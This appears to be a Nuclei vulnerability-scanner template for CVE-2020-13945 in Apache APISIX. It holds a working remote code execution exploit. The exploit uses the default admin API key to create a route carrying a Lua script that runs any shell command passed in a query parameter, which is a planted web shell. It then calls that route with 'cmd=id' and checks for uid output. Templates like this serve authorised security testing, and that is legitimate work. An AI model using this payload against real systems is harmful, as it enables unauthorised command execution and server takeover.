id: CVE-2020-13945
info:
  author: pdteam
  classification:
    cve-id: CVE-2020-13945
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 6.5
  description: In Apache APISIX, the user enabled the Admin API and deleted the Admin
    API access IP restriction rules. Eventually, the default token is allowed to access
    APISIX management data. This affects versions 1.2, 1.3, 1.4, 1.5.
  name: Apache APISIX's Admin API Default Access Token (RCE)
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2020-13945
  - https://github.com/vulhub/vulhub/tree/master/apisix/CVE-2020-13945
  - https://lists.apache.org/thread.html/r792feb29964067a4108f53e8579a1e9bd1c8b5b9bc95618c814faf2f%40%3Cdev.apisix.apache.org%3E
  - http://packetstormsecurity.com/files/166228/Apache-APISIX-Remote-Code-Execution.html
  severity: medium
  tags: cve,cve2020,apache,apisix,rce,intrusive
requests:
- extractors:
  - regex:
    - ((u|g)id|groups)=[0-9]{1,4}\([a-z0-9]+\)
    type: regex
  matchers:
  - condition: and
    type: word
    words:
    - '"action":"create"'
    - '"script":'
    - '"node":'
  - status:
    - 201
    type: status
  matchers-condition: and
  raw:
  - "POST /apisix/admin/routes HTTP/1.1\nHost: {{Hostname}}\nX-API-KEY: edd1c9f034335f136f87ad84b625c8f1\n\
    Content-Type: application/json\n\n{\n  \"uri\":\"/{{randstr}}\",\n  \"script\"\
    :\"local _M = {} \\n function _M.access(conf, ctx) \\n local os = require('os')\\\
    n local args = assert(ngx.req.get_uri_args()) \\n local f =        assert(io.popen(args.cmd,\
    \ 'r'))\\n local s = assert(f:read('*a'))\\n ngx.say(s)\\n f:close()  \\n end\
    \ \\nreturn _M\",\n  \"upstream\":{\n    \"type\":\"roundrobin\",\n    \"nodes\"\
    :{\n      \"example.com:80\":1\n    }\n  }\n}\n"
  - 'GET /{{randstr}}?cmd=id HTTP/1.1

    Host: {{Hostname}}

    '
